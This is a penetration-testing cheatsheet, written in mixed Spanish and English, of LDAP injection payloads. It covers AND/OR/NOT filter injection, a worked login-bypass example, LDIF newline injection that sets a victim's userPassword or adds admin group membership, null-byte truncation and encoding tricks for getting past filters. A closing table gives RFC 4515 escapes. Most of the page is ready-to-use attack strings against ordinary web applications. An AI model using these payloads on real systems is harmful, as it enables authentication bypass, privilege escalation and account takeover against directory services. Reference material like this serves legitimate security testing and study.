---
aliases:
  - LDAP Filter Injection
  - AND OR Injection
  - LDAP Comments
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - technique/initial-access
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
---
# LDAP Injection - Filter Manipulation

***

## AND / OR Injection

| **Operator** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| AND injection `&` | `*)(&(uid=admin)` | Force AND condition. |
| OR injection `\|` | `*)(\|(uid=*` | Force OR — match all. |
| NOT injection `!` | `*)(!(uid=admin)(uid=*` | Negation. |
| Escape filter context | Need to balance parens | `*)(<inject>` |
| Universal true | `(\|(\|(uid=*` | Always matches. |
| Universal false | `(&(uid=)(uid=))` | Never matches. |
| Override filter | `*)(\|(uid=*))(\|(uid=admin)` | Replace original filter logic. |
| Multi-OR brute | `(\|(uid=a)(uid=b)(uid=c)...)` | Multi-target enum. |
| AND with conditions | `*)(&(memberOf=admins)(uid=*` | Constrained search. |
| Negation enum | `(&(uid=*)(!(uid=admin)))` | Find non-admin users. |
^ldap-filter-andor

### Filter inyectado vs original

```
Original: (&(uid={user})(password={pass}))

Injection: user = *)(uid=*

Result:    (&(uid=*)(uid=*)(password={pass}))
                ^ first segment matches all
                ^ second still requires password match

# Pero si pass también vulnerable:
user = *)(|(uid=*       pass = *)(|(uid=*

Result:    (&(uid=*)(|(uid=*))(password=*)(|(uid=*)))
            ^ matches everyone, both segments OR=true
```

___

## Nested Filters

| **Payload** | **Notas** |
|:---:|:---:|
| `(&(uid={u})(\|(role=admin)(role=manager)))` | Nested OR within AND. |
| `(\|(&(uid={u})(active=true))(&(uid={u})(emergency=true)))` | Nested AND within OR. |
| Atacante inyecta nested para confundir parser | Some parsers fail con nesting profundo. |
| `((((((` | Stack overflow / DoS. |
| Mismatch parentheses | `(((uid=*)` | Some servers tolerate, others reject. |
| Escape via inner filter | `(uid={u})(emergency=*)` | Inject second filter at end. |
^ldap-filter-nested

___

## LDAP Attribute Injection (en Add/Modify)

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App escribe LDAP entries (registración, profile update) sin sanitizar | Modify/Add operations. |
| Inject extra attribute | Field "name" = `John\nuserPassword: ATTACKER` | LDIF injection. |
| Add memberOf | `name = John\nmemberOf: cn=admin,dc=...` | Group membership. |
| Inject via newline | LDIF parser reads each `attr: value` line | Standard inject. |
| URL-encoded newline | `%0a` literal | When passed through HTTP. |
| Unicode newline | LF `
`, CRLF `
` | Various whitespace. |
| LDIF directive injection | `name = John\n-\nadd: userPassword\nuserPassword: x` | Multi-op. |
| Multi-DN inject | Add user to alternate DN | DN injection. |
| Modify password de otro user | If app permits update by DN with input | Account takeover. |
| Schema violation injection | Inject attribute not in schema → error | Disclosure. |
^ldap-filter-attribute

___

## LDAP Comments y Null-Byte

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| LDAP no tiene comments oficiales | RFC 4515 doesn't define comments | False trick. |
| Null byte truncation | `username=admin\x00trailing` | Some apps truncate at NUL. |
| URL-encoded NUL | `username=admin%00trailing` | Decoded by web layer. |
| Extra whitespace | LDAP filters tolerate spaces | Edge case. |
| Encoded chars | `\28` = `(`, `\29` = `)`, `\2a` = `*` | LDAP filter escape. |
| Hex escape encoding | `\5c` = `\`, `\00` = NUL | Used for binary data. |
| Bypass filter | Si app sanitiza chars en cleartext, encoded chars pueden pasar | Filter bypass. |
| Combine con encoding | URL-encode + LDAP-encode | Multi-layer. |
| Whitespace in values | `attr=value with space` | Server may strip. |
| Backslash escape | Atacante usa `\28\29` to "escape" filter chars de la app's escaping | Double-encoding. |
^ldap-filter-comments

### LDAP filter character escaping (RFC 4515)

| Char | Escape |
|---|---|
| `*` | `\2a` |
| `(` | `\28` |
| `)` | `\29` |
| `\` | `\5c` |
| NUL | `\00` |

Si app espera `\2a` literal en input pero atacante manda raw `*`, app puede insertarlo sin escape → LDAP wildcard activado.

***
